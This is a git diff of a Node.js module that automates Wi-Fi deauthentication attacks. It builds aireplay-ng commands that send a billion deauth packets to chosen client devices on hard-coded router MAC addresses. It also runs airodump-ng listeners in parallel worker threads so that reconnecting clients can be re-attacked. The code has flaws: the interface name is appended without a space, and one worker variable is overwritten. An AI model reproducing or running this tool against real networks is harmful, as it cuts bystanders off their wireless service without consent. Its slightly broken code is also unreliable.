@@ -1,9 +1,12 @@
 const { Worker } = require("worker_threads");
 const { exec } = require("child_process");
 
+const INTERFACE = "wlan1";
 const parallelWorkers = {
     N2_4GHZ: null,
-    N5GHZ: null
+    N2_4GHZ_Listener: null,
+    N5GHZ: null,
+    N5GHZ_Listener: null
 };
 
 
@@ -13,7 +16,6 @@ function generateDeauthCMD(targets){
     const ROUTER_2_4_GHZ_MAC = "88:AD:43:45:EC:48";
     const ROUTER_5_GHZ_MAC = "88:AD:43:45:EC:50";
     const PACKET_AMT = 1_000_000_000;
-    
     let TARGETS2_4GHZ = "";
     let TARGETS5GHZ = "";
 
@@ -27,8 +29,8 @@ function generateDeauthCMD(targets){
     });
 
     // validate that we have at least 1 target on each network type, if not return null
-    const COMMAND_2_4_GHZ = (TARGETS2_4GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_2_4_GHZ_MAC} -c ` + TARGETS2_4GHZ : null;
-    const COMMAND_5_GHZ = (TARGETS5GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_5_GHZ_MAC} -c ` + TARGETS5GHZ : null;
+    const COMMAND_2_4_GHZ = (TARGETS2_4GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_2_4_GHZ_MAC} -c ` + TARGETS2_4GHZ + INTERFACE: null;
+    const COMMAND_5_GHZ = (TARGETS5GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_5_GHZ_MAC} -c ` + TARGETS5GHZ + INTERFACE: null;
 
 
     return [
@@ -104,7 +106,72 @@ function runParallelDeuth(allDevices){
 
 
 
-    console.log(`deauth\n${COMMAND_2_4_GHZ}\n${COMMAND_5_GHZ}\n\n`);
+}
+
+function runParallelDeuthLite(allDevices, networkData){
+    /*
+        deauthenticates users in parallel using 2 threads
+        one thread deauthenticates the user on a specific 
+        type of network while we listen for new connections
+    */
+    
+    let targets = getTargets(allDevices);
+    // no targets => do nothing
+    if (targets.length < 1){
+        return;
+    }
+
+    // create threads to execute
+    const [ COMMAND_2_4_GHZ, COMMAND_5_GHZ ] = generateDeauthCMD(targets);
+    const LISTEN_COMMAND = `airodump-ng --bssid ${networkData.accessMac} --channel ${networkData.channel} ${INTERFACE}`;
+    const [ATTACKING_2_4_GHZ_NETWORK, ATTACKING_5_GHZ_NETWORK] = [
+        networkData.networkType === '2.4 GHZ' && COMMAND_2_4_GHZ !== null,
+        networkData.networkType === '5 GHZ' && COMMAND_5_GHZ !== null
+    ];
+
+    // spawn 2.4 GHZ thread
+    if (ATTACKING_2_4_GHZ_NETWORK){
+        // kill old thread if we need to respawn
+        if (parallelWorkers.N2_4GHZ && parallelWorkers.N2_4GHZ_Listener){
+            parallelWorkers.N2_4GHZ.terminate();
+            parallelWorkers.N2_4GHZ_Listener.terminate();
+        }
+        
+        // spawn threads to listen for new connections and attack targets
+        parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
+            workerData: COMMAND_2_4_GHZ 
+        })
+
+        parallelWorkers.N2_4GHZ = new Worker("./deauthListener2_4.js", {
+            workerData: LISTEN_COMMAND 
+        })
+        
+        parallelWorkers.N2_4GHZ.on("message", data => {
+            console.log(data);
+        });
+    }
+    
+    // spawn 5 GHZ thread
+    else if (ATTACKING_5_GHZ_NETWORK){
+        // kill old thread if we need to respawn
+        if (parallelWorkers.N5GHZ && parallelWorkers.N5GHZ_Listener){
+            parallelWorkers.N5GHZ.terminate();
+            parallelWorkers.N5GHZ_Listener.terminate();
+        }
+        
+        // spawn threads to listen for new connections and attack targets
+        parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
+            workerData: COMMAND_5_GHZ 
+        })
+
+        parallelWorkers.N5GHZ_Listener = new Worker("./deauthListener5.js", {
+            workerData: LISTEN_COMMAND 
+        })
+        
+        parallelWorkers.N5GHZ.on("message", data => {
+            console.log(data);
+        });
+    }
 }
 
 
@@ -122,6 +189,7 @@ function executeCMD(command){
 
 module.exports = {
     runParallelDeuth,
+    runParallelDeuthLite,
     executeCMD,
     parallelWorkers
 }
